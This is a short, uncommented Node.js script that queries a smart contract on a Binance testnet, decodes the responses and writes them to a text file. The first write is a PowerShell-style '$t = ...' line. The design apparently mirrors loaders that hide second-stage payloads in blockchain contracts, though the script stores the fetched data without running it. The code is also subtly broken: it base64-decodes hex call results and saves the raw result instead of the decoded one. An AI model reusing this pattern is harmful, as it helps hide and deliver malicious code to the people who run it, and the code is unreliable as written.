const web3Module = require("web3");
const fs = require("fs");

const web3 = new web3Module("BINANCE_TESTNET_RPC_URL");
const contractAddress = "0x9223f0630c598a200f99c5d4746531d10319a569";

async function callContractFunction(inputString) {
  try {
    const methodId = "0x5684cff5";
    const encodedData = methodId + web3.eth.abi
      .encodeParameters(["string"], [inputString])
      .slice(2);

    const result = await web3.eth.call({ to: contractAddress, data: encodedData });
    const decodedData = Buffer.from(result, "base64").toString("utf-8");

    const filePath = "43152014.txt";
    fs.writeFileSync(filePath, `$t = ${decodedData}\n`);

    const newMethodId = "0x5c880fcb";
    const newEncodedData = newMethodId + web3.eth.abi
      .encodeParameters(["string"], [decodedData])
      .slice(2);

    const newData = await web3.eth.call({ to: contractAddress, data: newEncodedData });
    const decodedOutput = Buffer.from(newData, "base64").toString("utf-8");

    fs.writeFileSync(filePath, newData);
    console.log(`Saved data to file: ${filePath}`);
  } catch (error) {
    console.error("Error calling function:", error);
  }
}

const inputString = "KEY_CHECK_VALUE";
callContractFunction(inputString);